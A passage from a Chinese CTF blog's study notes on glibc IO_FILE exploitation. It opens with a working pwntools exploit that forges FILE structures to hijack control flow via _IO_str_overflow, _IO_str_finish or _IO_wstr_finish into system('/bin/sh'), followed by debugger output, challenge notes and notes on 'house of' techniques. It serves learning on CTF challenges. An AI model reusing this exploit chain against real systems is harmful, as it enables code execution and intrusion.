<span class="n">p</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x40</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xd41</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="n">p</span><span class="p">)</span>
<span class="n">build</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="s">'b'</span><span class="p">)</span> <span class="c1"># 最大就0x1000
</span><span class="n">build</span><span class="p">(</span><span class="mh">0x400</span><span class="p">,</span> <span class="s">'c'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"c"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3db278</span><span class="c1"># 0x3c2168
</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'libc addr ===&gt; 0x{:x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">))</span>
<span class="c1"># 由于vtable的check，无法将vtable写到heap段，所以不需要leak heap了
# 改动：但是有些函数的bypass需要改fp-&gt;_wide_data，所以还是leak一下
</span><span class="n">edit</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s">'c'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"c"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">heap_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'heap addr ===&gt; 0x{:x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>

<span class="n">io_list_all_off</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_IO_list_all'</span><span class="p">]</span>
<span class="n">io_list_all_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">io_list_all_off</span>
<span class="n">system_off</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">system_off</span>
<span class="n">io_file_jumps_off</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_IO_file_jumps'</span><span class="p">]</span>
<span class="n">io_file_jumps_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">io_file_jumps_off</span>
<span class="n">io_str_overflow_addr</span> <span class="o">=</span> <span class="n">io_file_jumps_addr</span> <span class="o">+</span> <span class="mh">0xd8</span>
<span class="n">io_str_finish_addr</span> <span class="o">=</span> <span class="n">io_file_jumps_addr</span> <span class="o">+</span> <span class="mh">0xd0</span>
<span class="n">io_wstr_finish_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="mh">0x3d6c70</span>
<span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">))</span>

<span class="n">poc_list</span> <span class="o">=</span> <span class="p">[</span><span class="s">'_IO_str_overflow'</span><span class="p">,</span> <span class="s">'_IO_str_finish'</span><span class="p">,</span> <span class="s">'_IO_wstr_finish'</span><span class="p">]</span>
<span class="n">poc</span> <span class="o">=</span> <span class="n">poc_list</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="k">if</span> <span class="n">poc</span> <span class="o">==</span> <span class="s">'_IO_str_overflow'</span><span class="p">:</span>
    <span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">io_str_overflow_addr</span> <span class="o">-</span> <span class="mh">0x18</span>
    <span class="n">p</span> <span class="o">=</span> <span class="s">'c'</span><span class="o">*</span><span class="mh">0x420</span> <span class="c1"># padding to unsorted bin chunk
</span>
    <span class="n">fake_file</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="c1"># fake file structure, to smallbin[4], _chain
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># fd
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">io_list_all_addr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># bk, unsorted bin attack
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_write_base
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7fffffffffffffff</span><span class="p">)</span> <span class="c1"># _IO_write_ptr
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_write_end
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_buf_base
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">bin_sh_addr</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># _IO_buf_end
</span>    <span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xd8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># padding to vtable
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_vtable</span><span class="p">)</span>
    <span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># padding to 0xe0
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
    
    <span class="n">p</span> <span class="o">+=</span> <span class="n">fake_file</span>
<span class="k">elif</span> <span class="n">poc</span> <span class="o">==</span> <span class="s">'_IO_str_finish'</span><span class="p">:</span>
    <span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">io_str_finish_addr</span> <span class="o">-</span> <span class="mh">0x18</span>
    <span class="n">p</span> <span class="o">=</span> <span class="s">'c'</span><span class="o">*</span><span class="mh">0x420</span> <span class="c1"># padding to unsorted bin chunk
</span>
    <span class="n">fake_file</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="c1"># fake file structure, to smallbin[4], _chain
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># fd
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">io_list_all_addr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># bk, unsorted bin attack
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_write_base
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># _IO_write_ptr
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_write_end
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span> <span class="c1"># _IO_buf_base, rdi
</span>    <span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xd8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># padding to vtable
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_vtable</span><span class="p">)</span>
    <span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xe8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># padding to 0xe8
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>  <span class="c1">#rip
</span>    
    <span class="n">p</span> <span class="o">+=</span> <span class="n">fake_file</span>
<span class="k">elif</span> <span class="n">poc</span> <span class="o">==</span> <span class="s">'_IO_wstr_finish'</span><span class="p">:</span>
    <span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">io_wstr_finish_addr</span> <span class="o">-</span> <span class="mh">0x18</span>
    <span class="n">fake_wide_data</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x430</span> <span class="o">+</span> <span class="mh">0x68</span> <span class="c1"># _wide_data指到FILE-&gt;_chain, _wide_data-&gt;_IO_buf_base刚好指到了FILE-&gt;_codecvt
</span>    <span class="n">p</span> <span class="o">=</span> <span class="s">'c'</span><span class="o">*</span><span class="mh">0x420</span> <span class="c1"># padding to unsorted bin chunk
</span>
    <span class="n">fake_file</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="c1"># fake file structure, to smallbin[4], _chain
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># fd
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">io_list_all_addr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># bk, unsorted bin attack
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_write_base
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># _IO_write_ptr
</span>    <span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x98</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># padding to _codecvt
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span> <span class="c1"># _codecvt,  _wide_data-&gt;_IO_buf_base
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_wide_data</span><span class="p">)</span> <span class="c1"># _wide_data
</span>    <span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xd8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># padding to vtable
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_vtable</span><span class="p">)</span>
    <span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xe8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># padding to 0xe8
</span>    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
    
    <span class="n">p</span> <span class="o">+=</span> <span class="n">fake_file</span>


<span class="n">edit</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="n">p</span><span class="p">)</span>

<span class="c1"># debug("b *_IO_flush_all_lockp\n")
</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>


<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>测试FSOP条件是否达成，以及看看call的是什么函数，使用pwngdb的fsop命令很方便：</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre>pwndbg&gt; fsop
<span class="nt">----------</span> fp : 0x7ffff7dcfc78 <span class="nt">----------</span>
_IO_write_ptr<span class="o">(</span>0x7ffff7dcfc88<span class="o">)</span> &lt; _IO_write_base<span class="o">(</span>0x7ffff7dcfc88<span class="o">)</span>
Result : False
<span class="nt">----------</span> fp : 0x555555766750 <span class="nt">----------</span>
Result : True
Func :  0x7ffff7a7cae0
pwndbg&gt; x/gx 0x7ffff7a7cae0
0x7ffff7a7cae0 &lt;_IO_str_finish&gt;:        0x387f8b48fb894853
pwndbg&gt; fpchain
fpchain: 0x7ffff7dcfc78 <span class="nt">--</span><span class="o">&gt;</span> 0x555555766750 <span class="nt">--</span><span class="o">&gt;</span> 0x0
pwndbg&gt; fp 0x555555766750
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>
  file <span class="o">=</span> <span class="o">{</span>
    _flags <span class="o">=</span> 0,
    _IO_read_ptr <span class="o">=</span> 0x61 &lt;error: Cannot access memory at address 0x61&gt;,
    _IO_read_end <span class="o">=</span> 0x7ffff7dcfcc8 &lt;main_arena+168&gt; <span class="s2">"</span><span class="se">\2</span><span class="s2">70</span><span class="se">\3</span><span class="s2">74</span><span class="se">\3</span><span class="s2">34</span><span class="se">\3</span><span class="s2">67</span><span class="se">\3</span><span class="s2">77</span><span class="se">\1</span><span class="s2">77"</span>,
    _IO_read_base <span class="o">=</span> 0x7ffff7dcfcc8 &lt;main_arena+168&gt; <span class="s2">"</span><span class="se">\2</span><span class="s2">70</span><span class="se">\3</span><span class="s2">74</span><span class="se">\3</span><span class="s2">34</span><span class="se">\3</span><span class="s2">67</span><span class="se">\3</span><span class="s2">77</span><span class="se">\1</span><span class="s2">77"</span>,
    _IO_write_base <span class="o">=</span> 0x0,
    _IO_write_ptr <span class="o">=</span> 0x1 &lt;error: Cannot access memory at address 0x1&gt;,
    _IO_write_end <span class="o">=</span> 0x0,
    _IO_buf_base <span class="o">=</span> 0x7ffff7b98f20 <span class="s2">"/bin/sh"</span>,
    _IO_buf_end <span class="o">=</span> 0x0,
    _IO_save_base <span class="o">=</span> 0x0,
    _IO_backup_base <span class="o">=</span> 0x0,
    _IO_save_end <span class="o">=</span> 0x0,
    _markers <span class="o">=</span> 0x0,
    _chain <span class="o">=</span> 0x0,
    _fileno <span class="o">=</span> 0,
    _flags2 <span class="o">=</span> 0,
    _old_offset <span class="o">=</span> 0,
    _cur_column <span class="o">=</span> 0,
    _vtable_offset <span class="o">=</span> 0 <span class="s1">'\000'</span>,
    _shortbuf <span class="o">=</span> <span class="s2">""</span>,
    _lock <span class="o">=</span> 0x0,
    _offset <span class="o">=</span> 0,
    _codecvt <span class="o">=</span> 0x0,
    _wide_data <span class="o">=</span> 0x0,
    _freeres_list <span class="o">=</span> 0x0,
    _freeres_buf <span class="o">=</span> 0x0,
    __pad5 <span class="o">=</span> 0,
    _mode <span class="o">=</span> 0,
    _unused2 <span class="o">=</span> <span class="s1">'\000'</span> &lt;repeats 19 <span class="nb">times</span><span class="o">&gt;</span>
  <span class="o">}</span>,
  vtable <span class="o">=</span> 0x7ffff7dcc498
<span class="o">}</span>
</pre></table></code></div></div><h2 id="0x07-wctf-2017--wannaheap">0x07 WCTF 2017 wannaheap<a href="#0x07-wctf-2017--wannaheap" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>关于这题，和FSOP的关系不是那么大，更多考察的是FILE Structure的理解，更具体的是<code class="language-plaintext highlighter-rouge">_IO_buf_base</code>与<code class="language-plaintext highlighter-rouge">_IO_buf_end</code>这两个element。</p><p><a href="https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf">Play with FILE Structure Yet Another Binary Exploitation Technique </a> 内有这题的所有背景知识：</p><ul><li><strong>2.2小节</strong>， FILE Struture的结构，字段的作用<li><strong>2.3小节</strong>， fread/fwrite的workflow (fread/scanf/fgets都是一样的，底层都会调用stdin file structure)<li><strong>3.3.4小节</strong>，对于劫持程序流的理解</ul><p>该<a href="https://www.anquanke.com/post/id/87194">文章</a>对于这题的利用手法写的很详细了，完全按照他的思路来就可以做出这题。（小提示：这题完全不用管他实现的乱七八糟的堆块分配算法~~）</p><p>因为pwnable.tw的rule，所以不贴完整的exp了，只贴下做这题时学到的知识点。</p><ul><li>调用scanf/fgets这些函数时，glibc底层会调用<code class="language-plaintext highlighter-rouge">read(0, _IO_buf_base, size(_IO_buf_end - _IO_buf_base))</code></ul><p>stream buffer大小是由<code class="language-plaintext highlighter-rouge">_IO_buf_end - _IO_buf_base</code>决定</p><ul><li><p>劫持控制流的思路，因为有seccomp，所以这题只能走ROP。而且需要栈迁移，把rsp指到ROP chain上，这点setcontext是最方便的，所以首要的任务就是控制rdi寄存器</p><ul><li><p>最先想到的肯定是最容易的写<code class="language-plaintext highlighter-rouge">malloc_hook</code>，直接写上setcontext，如果malloc可以指定大小，写入的内容就可以控制rdi，但是这题malloc值的固定的。所以无法控制rdi</p><li><p><a href="https://www.anquanke.com/post/id/87194">文章</a>的方式是使用<code class="language-plaintext highlighter-rouge">unsorted bin attack</code>在<code class="language-plaintext highlighter-rouge">_dl_open_hook</code>上写上<code class="language-plaintext highlighter-rouge">main_arena+0x88</code></p><ul><li><p>原理是：当malloc或者free出错时，触发<code class="language-plaintext highlighter-rouge">mallocprinterr -&gt; __libc_message -&gt; xxxx -&gt; __libc_dlopen_mode</code></p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">__libc_dlopen_mode</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mode</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">do_dlopen_args</span> <span class="n">args</span><span class="p">;</span>
  <span class="n">args</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
  <span class="n">args</span><span class="p">.</span><span class="n">mode</span> <span class="o">=</span> <span class="n">mode</span><span class="p">;</span>
  <span class="n">args</span><span class="p">.</span><span class="n">caller_dlopen</span> <span class="o">=</span> <span class="n">RETURN_ADDRESS</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
      
<span class="cp">#ifdef SHARED
</span>  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">_dl_open_hook</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">_dl_open_hook</span><span class="o">-&gt;</span><span class="n">dlopen_mode</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">mode</span><span class="p">);</span>   <span class="o">&lt;====</span> <span class="err">这一行</span>
  <span class="k">return</span> <span class="p">(</span><span class="n">dlerror_run</span> <span class="p">(</span><span class="n">do_dlopen</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">args</span><span class="p">)</span> <span class="o">?</span> <span class="nb">NULL</span> <span class="o">:</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">args</span><span class="p">.</span><span class="n">map</span><span class="p">);</span>
</pre></table></code></div></div><p>触发的是<code class="language-plaintext highlighter-rouge">_dl_open_hook-&gt;dlopen_mode (name, mode)</code>，也就是<code class="language-plaintext highlighter-rouge">**_dl_open_hook</code></p><p><code class="language-plaintext highlighter-rouge">*_dl_open_hook = main_arena+0x88 </code> =&gt; <code class="language-plaintext highlighter-rouge">rax point to main_arena+0x88 </code></p><p><code class="language-plaintext highlighter-rouge">**_dl_open_hook = *main_arena+0x88 = gadget</code> =&gt; <code class="language-plaintext highlighter-rouge">control rip</code></p><p>使用<code class="language-plaintext highlighter-rouge">mov rdi, rax ; call qword ptr [rax + 0x20]</code>就可以控制rdi了</p></ul><li><p>FSOP方式</p><ul><li>常规的触发方式不行，abort会触发系统调用，由于沙箱限制程序调用；程序无法从main返回；程序退出使用<code class="language-plaintext highlighter-rouge">_exit</code>，不会触发flussh, 而程序中的<code class="language-plaintext highlighter-rouge">exit</code>无法调用到<li>改stdin的vtable，scanf会触发stdin的underflow，所以劫持stdin vtable的underflow函数。可以改成<code class="language-plaintext highlighter-rouge">_IO_wfile_sync</code>，<code class="language-plaintext highlighter-rouge">_IO_wfile_sync</code>会调用<code class="language-plaintext highlighter-rouge">fp-&gt;_IO_codevt</code>，将stdin的<code class="language-plaintext highlighter-rouge">_IO_codecvt</code>写setcontext，就可以控制rdi位stdin fp，rip为setcontext<li>malloc_hook改<code class="language-plaintext highlighter-rouge">abort</code>，触发FSOP，(不能直接填<code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp</code>的地址，填<code class="language-plaintext highlighter-rouge">abort</code>中<code class="language-plaintext highlighter-rouge">call _IO_flush_all_lockp</code>前一点点)。改stdin的chain，指到fake file structure，控制rdi为fake file fp, rip为setcontext<li>malloc_hook改glibc中的<code class="language-plaintext highlighter-rouge">exit</code></ul><li><p>control stdin’s <code class="language-plaintext highlighter-rouge">_markers</code>, <code class="language-plaintext highlighter-rouge">_IO_save_base</code>, <code class="language-plaintext highlighter-rouge">_IO_save_end</code> and <code class="language-plaintext highlighter-rouge">_IO_read_base</code></p><ul><li>控制这几个字段，就可以控制malloc、free、memcpy，达成任意地址写。</ul></ul><li><p>最后，需要对文件描述符有清楚的认知哦</p><ul><li><a href="https://juejin.cn/post/6844903962043236365">带你破案：文件描述符到底是什么？</a></ul></ul><h2 id="0x08-hitcon-2017--ghost-in-the-heap">0x08 HITCON 2017 : Ghost in The Heap<a href="#0x08-hitcon-2017--ghost-in-the-heap" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="/assets/file/ghost_in_the_heap.tar.gz">程序附件</a></p><p>更多是考察堆排布</p><p>三个要点</p><ol><li>通过free时触发malloc consolidate，获得unsorted bin chunk<li>off-by-null的利用：参考<a href="https://siriushsh.github.io/posts/heap%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/#0x07-shrink_the_chunk">shrink the chunk</a>，构造overlap的思路是一样的<li>打unsorted bin attack，写<code class="language-plaintext highlighter-rouge">_IO_buf_end</code></ol><h2 id="0x09-hctf2017-babyprintf">0x09 HCTF2017 babyprintf<a href="#0x09-hctf2017-babyprintf" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h2 id="0x10-other-trick-house-of-xxx">0x10 Other Trick (house of xxx)<a href="#0x10-other-trick-house-of-xxx" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="house-of-wiki"><a href="https://www.anquanke.com/post/id/235598">house of wiki</a><a href="#house-of-wiki" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>通过<code class="language-plaintext highlighter-rouge">assert</code>触发<li>需要修改<code class="language-plaintext highlighter-rouge">_IO_file_sync</code>，以及<code class="language-plaintext highlighter-rouge">_IO_helper_jumps + 0xa0</code>和<code class="language-plaintext highlighter-rouge">_IO_helper_jumps+0xa8</code>，暴力达成setcontext条件<li>glibc2.29之后才可用，从2.29之后vtable 可写</ul><h3 id="house-of-pig"><a href="https://www.anquanke.com/post/id/242640">house of pig</a><a href="#house-of-pig" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>glibc2.28之后，<code class="language-plaintext highlighter-rouge">_IO_str_overflow</code>中的相对地址调用修改了<code class="language-plaintext highlighter-rouge">malloc</code>和<code class="language-plaintext highlighter-rouge">free</code><li>https://hitworld.github.io/posts/7d2bf29a/</ul><h3 id="house-of-emma"><a href="https://www.anquanke.com/post/id/260614">house of emma</a><a href="#house-of-emma" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>需要修改或leak tls，打爆指针保护。体感不太好用</ul><h3 id="house-of-apple"><a href="https://bbs.pediy.com/thread-273418.htm">house of apple</a><a href="#house-of-apple" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>还没太细看，粗略的看了眼是收集了一些相对好用的利用链<li>使用广度有待考察</ul><h2 id="io_file利用随glibc版本的变动">IO_FILE利用随glibc版本的变动<a href="#io_file利用随glibc版本的变动" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>glibc-2.24<ul><li>新增vtable check</ul><li>glibc-2.27<ul><li><code class="language-plaintext highlighter-rouge">abort</code>不再调用<code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp</code></ul><li>glibc-2.28<ul><li>glibc2.28之后<code class="language-plaintext highlighter-rouge">_IO_str_overflow </code>等系列函数实现上取消了相对地址调用，改为了<code class="language-plaintext highlighter-rouge">malloc</code>和<code class="language-plaintext highlighter-rouge">free</code>，而其参数可以控制，因此可以利用这点来进行非预期的堆块申请和释放，例如house of pig<ul><li>注：2.29比较特别，还是相对地址调用</ul></ul><li>glibc-2.29<ul><li>glibc2.29之后vtable可写了</ul></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/pwn/'>pwn</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=IO_FILE学习笔记 - SiriusHsh&url=https://siriushsh.github.io/posts/IO_FILE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=IO_FILE学习笔记 - SiriusHsh&u=https://siriushsh.github.io/posts/IO_FILE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=IO_FILE学习笔记 - 